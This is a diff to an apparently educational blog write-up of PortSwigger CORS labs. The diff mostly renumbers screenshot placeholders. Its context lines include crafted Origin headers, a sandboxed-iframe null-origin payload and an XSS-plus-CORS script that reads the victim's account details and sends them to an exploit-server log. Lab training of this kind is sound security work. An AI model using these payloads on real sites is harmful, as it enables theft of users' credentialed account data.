@@ -43,12 +43,20 @@ Cookie: session=<victim>
 Origin: https://example.com
 ```
 
+> **Picture goes here (#2).** Capture this request/response or command step in Burp/terminal. Key line: `Origin: https://example.com`.
+> _Save as_ `images/portswigger-cors-labs/2.png` _then replace this block with_ `![Lab 1 — CORS vulnerability with basic origin reflection](/images/portswigger-cors-labs/2.png)`_._
+
+
 3. The response reflects it:
 
 ```http
 Access-Control-Allow-Origin: https://example.com
 Access-Control-Allow-Credentials: true
 ```
+
+> **Picture goes here (#3).** Capture this request/response or command step in Burp/terminal. Key line: `Access-Control-Allow-Origin: https://example.com`.
+> _Save as_ `images/portswigger-cors-labs/3.png` _then replace this block with_ `![Lab 1 — CORS vulnerability with basic origin reflection](/images/portswigger-cors-labs/3.png)`_._
+
 
 4. Host this on the exploit server:
 
@@ -65,16 +73,20 @@ function reqListener() {
 </script>
 ```
 
+> **Picture goes here (#4).** Capture this step in the decompiler/editor or terminal. Key line: `<script>`.
+> _Save as_ `images/portswigger-cors-labs/4.png` _then replace this block with_ `![Lab 1 — CORS vulnerability with basic origin reflection](/images/portswigger-cors-labs/4.png)`_._
+
+
 5. **View exploit** to confirm, then **Deliver exploit to victim**, and read the victim's key from the access log.
 
 **Why it works:** `withCredentials = true` sends the victim's cookies, and because the server reflects the attacker origin with credentials allowed, the browser lets the script read the response.
 
-> **Picture goes here (#2).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
-> _Save as_ `images/portswigger-cors-labs/2.png` _then replace this block with_ `![Lab 1 — CORS vulnerability with basic origin reflection](/images/portswigger-cors-labs/2.png)`_._
+> **Picture goes here (#5).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
+> _Save as_ `images/portswigger-cors-labs/5.png` _then replace this block with_ `![Lab 1 — CORS vulnerability with basic origin reflection](/images/portswigger-cors-labs/5.png)`_._
 
 ## Lab 2 — CORS vulnerability with trusted null origin
-> **Picture goes here (#3).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>`.
-> _Save as_ `images/portswigger-cors-labs/3.png` _then replace this block with_ `![Lab 2 — CORS vulnerability with trusted null origin](/images/portswigger-cors-labs/3.png)`_._
+> **Picture goes here (#6).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>`.
+> _Save as_ `images/portswigger-cors-labs/6.png` _then replace this block with_ `![Lab 2 — CORS vulnerability with trusted null origin](/images/portswigger-cors-labs/6.png)`_._
 
 
 **Difficulty:** Apprentice
@@ -95,16 +107,20 @@ function reqListener() {
 </script>"></iframe>
 ```
 
+> **Picture goes here (#7).** Capture this step in the decompiler/editor or terminal. Key line: `<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>`.
+> _Save as_ `images/portswigger-cors-labs/7.png` _then replace this block with_ `![Lab 2 — CORS vulnerability with trusted null origin](/images/portswigger-cors-labs/7.png)`_._
+
+
 **View exploit**, then **Deliver exploit to victim**, and read the key from the log.
 
 > **Why `null` is dangerous:** it is trivially spoofable and also appears in legitimate edge cases (sandboxed iframes, `file://`, some redirects). Never whitelist it.
 
-> **Picture goes here (#4).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
-> _Save as_ `images/portswigger-cors-labs/4.png` _then replace this block with_ `![Lab 2 — CORS vulnerability with trusted null origin](/images/portswigger-cors-labs/4.png)`_._
+> **Picture goes here (#8).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
+> _Save as_ `images/portswigger-cors-labs/8.png` _then replace this block with_ `![Lab 2 — CORS vulnerability with trusted null origin](/images/portswigger-cors-labs/8.png)`_._
 
 ## Lab 3 — CORS vulnerability with trusted insecure protocols
-> **Picture goes here (#5).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `Origin: http://subdomain.YOUR-LAB-ID.web-security-academy.net`.
-> _Save as_ `images/portswigger-cors-labs/5.png` _then replace this block with_ `![Lab 3 — CORS vulnerability with trusted insecure protocols](/images/portswigger-cors-labs/5.png)`_._
+> **Picture goes here (#9).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `Origin: http://subdomain.YOUR-LAB-ID.web-security-academy.net`.
+> _Save as_ `images/portswigger-cors-labs/9.png` _then replace this block with_ `![Lab 3 — CORS vulnerability with trusted insecure protocols](/images/portswigger-cors-labs/9.png)`_._
 
 
 **Difficulty:** Practitioner
@@ -116,6 +132,10 @@ function reqListener() {
 Origin: http://subdomain.YOUR-LAB-ID.web-security-academy.net
 ```
 
+> **Picture goes here (#10).** Capture this request/response or command step in Burp/terminal. Key line: `Origin: http://subdomain.YOUR-LAB-ID.web-security-academy.net`.
+> _Save as_ `images/portswigger-cors-labs/10.png` _then replace this block with_ `![Lab 3 — CORS vulnerability with trusted insecure protocols](/images/portswigger-cors-labs/10.png)`_._
+
+
 It is reflected with credentials allowed.
 2. Find a product page whose "Check stock" is loaded over **HTTP** on a subdomain, e.g. `http://stock.YOUR-LAB-ID...`, and confirm the `productId` parameter is **XSS-vulnerable**.
 3. Because the subdomain is trusted by CORS, JavaScript running there can read `/accountDetails` on the main site. Deliver this to the victim:
@@ -125,6 +145,10 @@ It is reflected with credentials allowed.
 document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
 </script>
 ```
+
+> **Picture goes here (#11).** Capture this step in the decompiler/editor or terminal. Key line: `<script>`.
+> _Save as_ `images/portswigger-cors-labs/11.png` _then replace this block with_ `![Lab 3 — CORS vulnerability with trusted insecure protocols](/images/portswigger-cors-labs/11.png)`_._
+
 
 **View exploit**, then **Deliver exploit to victim**, and read the key from the log.
 
@@ -155,5 +179,5 @@ document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=
 - [API Testing labs](/posts/portswigger-api-testing-labs/)
 - [SQL Injection lab series](/posts/portswigger-sqli-part-1-basics/)
 
-> **Picture goes here (#6).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
-> _Save as_ `images/portswigger-cors-labs/6.png` _then replace this block with_ `![Related posts](/images/portswigger-cors-labs/6.png)`_._
+> **Picture goes here (#12).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
+> _Save as_ `images/portswigger-cors-labs/12.png` _then replace this block with_ `![Related posts](/images/portswigger-cors-labs/12.png)`_._
